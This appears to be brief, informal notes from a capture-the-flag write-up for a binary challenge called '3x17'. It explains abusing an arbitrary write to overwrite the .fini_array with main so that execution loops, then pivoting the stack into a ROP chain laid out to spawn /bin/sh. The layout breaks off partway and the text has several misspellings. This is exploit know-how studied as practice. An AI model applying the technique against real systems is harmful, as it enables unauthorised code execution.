WRITE UP FOR 3x17

Overview:- we can abritary write address and data
	 - Constrait: messy decomplier, can see main function.

 
Input: 
-An address in string form 
-Data to aboved address

New thing to learn:
Every program will first call .Init and last call .Finit in _libc_start_main_ 
-Init: .init_arr:  contain pointer to constructor of function of program
-Fniit: .finit_arr: contain pointer to destructor of function of program

Exploit:
This binary has a function which called pointer in .finit_arr.(0x402960)
We can create an infinte loop by overwrite these pointer by main address and the .finit_call itself
	.finit_arr: [.finit_call]-> [main]

Then we can craft a payload on this finit_arr , call leave to drop the stack to this arr
payload layout:

.finit_call<---- replace by LEAVE at last to out loop
------
main
------
pop_rdi
------
bin_sh
-----
pop_rdx
-----
0
------
pop_rsi

pop_rax
